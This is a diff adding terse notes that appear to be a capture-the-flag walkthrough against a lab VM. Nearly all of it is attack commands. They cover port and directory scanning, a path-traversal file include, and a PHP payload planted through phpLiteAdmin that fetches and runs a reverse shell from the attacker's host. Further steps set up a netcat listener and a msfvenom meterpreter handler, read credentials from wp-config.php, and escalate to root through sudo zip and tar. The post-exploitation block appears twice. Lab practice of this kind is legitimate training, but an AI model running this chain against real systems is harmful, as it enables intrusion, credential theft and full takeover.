@@ -1,0 +1,80 @@
+nmap --top-ports 10 --open -Pn -n 192.168.159.139-top10TCP.nmap
+nmap -T4 -F 192.168.159.139
+192.168.159.139/view.php?page=././etc/passwd
+dirb http://192.168.159.139/ /user/share/dirb/wordlists/common.txt
+http://192.168.159.139/dbadmin/test_db.php
+password: admin
+searchsploit phpliteadmin
+
+Applications ->Web Application Analysis -> owasp-zap
+cp /usr/share/webshells/php/php-reverse-shell.php /root/Desktop/rshell.php
+change the 'sip, sport' to 'attacker_ip, attack_port 4444'
+create new database -> exploit.php
+name: exploit		value: 1
+DEFAULT VALUE = <?php system("cd /tmp; wget http://192.168.159.131:8000/rshell.php; chmod +x rshell.php; php rshell.php");?>
+
+CREATE TABLE 'hack' ('hack' TEXT default '<?php system("cd /tmp; wget http://attacker_ip:8000/rshell.php; chmod +x rshell.php; php rshell.php");?>')
+
+
+python -m SimpleHTTPServer
+nc -nvlp 4444
+run exploit.php
+	192.168.159.139/view.php?page=../../../../../../../../../../../../../../../../usr/databases/exploit.php
+in shell terminal
+python -c 'import pty;pty.spawn("/bin/bash")'
+cd /home/zico/wordpress/
+check wp-config.php
+find database user and password
+ssh zico@192.168.159.139
+ls -lah
+sudo -l
+touch exploit
+sudo -u root zip exploit.zip exploit -T --unzip-command="sh -c /bin/bash"
+id
+exit
+id
+sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec="/bin/bash"
+id
+cd /root
+ls -lah
+get flag.txt
+
+
+<?php system("whoami id; cat /etc/*-release; uname -a");?>
+
+msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.159.131 LPORT=445 -f elf -o shell
+file shell
+cp shell /var/www/html/
+chmod 777 /var/www/html/shell 
+systemctl start apache2
+create new databases	shell.php
+	<?php system("cd /tmp; wget http://192.168.159.131/shell; chmod 777 shell; ./shell"); ?>
+systemctl start postgresql
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.159.131
+set LPORT 445
+run
+sysinfo
+getuid
+shell
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+cd /home/zico/wordpress/
+check wp-config.php
+find database user and password
+ssh zico@192.168.159.139
+ls -lah
+sudo -l
+touch exploit
+sudo -u root zip exploit.zip exploit -T --unzip-command="sh -c /bin/bash"
+id
+exit
+id
+sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec="/bin/bash"
+id
+cd /root
+ls -lah
+get flag.txt
+
